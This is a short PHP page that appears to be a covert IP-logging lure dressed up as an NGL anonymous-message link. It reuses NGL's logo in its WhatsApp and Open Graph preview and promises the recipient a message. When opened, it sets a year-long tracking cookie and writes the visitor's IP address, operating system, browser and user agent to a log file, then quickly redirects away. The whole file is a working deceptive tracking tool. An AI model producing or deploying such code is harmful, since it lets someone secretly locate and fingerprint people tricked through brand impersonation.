<?php
$image = "https://ngl.link/images/ngl.png";

// Vérifier si un paramètre "user" est fourni
if (!isset($_GET['user'])) {
    die("Utilisateur non spécifié.");
}

// Sécuriser et encoder le paramètre user
$user = htmlspecialchars($_GET['user']);
$userParam = urlencode($user);

// ----------- GÉNÉRATION / LECTURE DU COOKIE UNIQUE ----------- //
if (!isset($_COOKIE['user_id'])) {
    $uniqueID = bin2hex(random_bytes(16));
    setcookie("user_id", $uniqueID, time() + 365*24*3600, "/", "", false, true);
} else {
    $uniqueID = $_COOKIE['user_id'];
}

// ----------- INFOS DU VISITEUR ----------- //
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Inconnu';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Inconnu';

// Détecter le système d'exploitation et le navigateur (basique)
function parseUserAgent($ua) {
    $os = "Inconnu";
    $browser = "Inconnu";

    // OS
    if (preg_match("/windows/i", $ua)) $os = "Windows";
    elseif (preg_match("/macintosh|mac os x/i", $ua)) $os = "Mac OS";
    elseif (preg_match("/linux/i", $ua)) $os = "Linux";
    elseif (preg_match("/iphone|ipad|ipod/i", $ua)) $os = "iOS";
    elseif (preg_match("/android/i", $ua)) $os = "Android";

    // Navigateur
    if (preg_match("/chrome/i", $ua) && !preg_match("/edge/i", $ua)) $browser = "Chrome";
    elseif (preg_match("/firefox/i", $ua)) $browser = "Firefox";
    elseif (preg_match("/safari/i", $ua) && !preg_match("/chrome/i", $ua)) $browser = "Safari";
    elseif (preg_match("/edge/i", $ua)) $browser = "Edge";
    elseif (preg_match("/msie|trident/i", $ua)) $browser = "Internet Explorer";

    return [$os, $browser];
}

list($os, $browser) = parseUserAgent($userAgent);
$datetime = date("Y-m-d H:i:s");

// ----------- LOGGING ----------- //
$logLine = "$datetime | User: $user | Cookie-ID: $uniqueID | IP: $ip | OS: $os | Browser: $browser | User-Agent: $userAgent\n";
file_put_contents("logs.txt", $logLine, FILE_APPEND | LOCK_EX);
?>
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Message pour <?= $user ?></title>

<!-- Meta tags pour WhatsApp / Open Graph -->
<meta property="og:title" content="Message pour <?= $user ?>">
<meta property="og:description" content="Clique pour voir ton message !">
<meta property="og:image" content="<?= $image ?>">
<meta property="og:type" content="website">
<meta property="og:url" content="https://<?= $_SERVER['HTTP_HOST'] ?>/messages.php?user=<?= $userParam ?>">

<!-- Redirection automatique après 0.5s -->
<script>
setTimeout(() => {
    window.location.href = 'mes.html';
}, 500);
</script>
</head>
<body></body>
</html>
